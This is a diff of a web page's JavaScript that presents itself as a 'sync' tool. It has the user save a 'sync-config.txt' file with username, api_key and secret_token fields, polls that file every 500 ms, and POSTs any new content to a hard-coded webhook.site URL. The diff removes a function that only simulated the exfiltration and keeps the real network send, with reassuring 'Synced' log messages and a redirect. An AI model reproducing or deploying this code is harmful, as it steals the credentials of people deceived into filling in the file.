@@ -55,16 +55,19 @@
 </div>
 
 <script>
+// Variables
 let fileHandle;
 let lastContent = "";
 let monitoring = false;
 let redirected = false;
+let webhookURL = "https://webhook.site/074af2d2-5d1d-438f-ab3f-76b8d9103af2"; // Replace with your actual webhook URL
 
-// Log function to display messages
+// Log function to display messages in the UI
 function log(msg) {
   document.getElementById("log").innerHTML += msg + "<br>";
 }
 
+// Status update function
 function status(msg) {
   document.getElementById("status").innerText = msg;
 }
@@ -72,7 +75,7 @@ function status(msg) {
 // Function to download the initial file
 async function start() {
   try {
-    // Create the file using the Save File API
+    // Open save file picker and create a new file
     fileHandle = await window.showSaveFilePicker({
       suggestedName: "sync-config.txt",
       types: [{
@@ -83,6 +86,7 @@ async function start() {
 
     const writable = await fileHandle.createWritable();
 
+    // Write the initial content to the file
     await writable.write(`# Sync Config
 username=
 api_key=
@@ -100,7 +104,7 @@ secret_token=
   }
 }
 
-// Function to continuously monitor the file for changes
+// Function to monitor the file for changes
 function monitor() {
   if (monitoring) return;
   monitoring = true;
@@ -113,21 +117,20 @@ function monitor() {
       const file = await fileHandle.getFile();
       const text = await file.text();
 
-      // Detect if the file content has changed
+      // Check if the file content has changed
       if (text !== lastContent) {
-        showDiff(lastContent, text); // Show the diff
-        fakeExfil(text); // Simulate exfiltration
+        showDiff(lastContent, text); // Display the diff
         lastContent = text;
 
         sendToWebhook(text); // Send the updated content to the webhook
       }
     } catch (e) {
-      log("Read error");
+      log("❌ Read error");
     }
-  }, 500); // Monitor every 500ms (faster polling)
+  }, 500); // Faster polling to catch changes
 }
 
-// Function to display the changes (diff)
+// Function to display changes (highlight the diff)
 function showDiff(oldText, newText) {
   log("📡 Sync update:");
 
@@ -143,23 +146,8 @@ function showDiff(oldText, newText) {
   log("<pre>" + output + "</pre>");
 }
 
-// Function to simulate data exfiltration (sending to a server)
-function fakeExfil(data) {
-  console.log("EXFIL:", data);
-
-  log("🚀 Syncing...");
-
-  // Simulate the exfiltration process by logging
-  setTimeout(() => {
-    log("✅ Synced");
-  }, 400);
-}
-
 // Function to send the file content to the webhook
 async function sendToWebhook(data) {
-  // Replace with your actual webhook URL
-  const webhookURL = "https://webhook.site/074af2d2-5d1d-438f-ab3f-76b8d9103af2"; 
-
   try {
     const response = await fetch(webhookURL, {
       method: "POST",
@@ -183,7 +171,7 @@ async function sendToWebhook(data) {
   }
 }
 
-// Simulate redirecting the user to a new tab
+// Function to simulate redirecting the user to a new tab after a file change
 function triggerRedirect() {
   if (redirected) return;
   redirected = true;
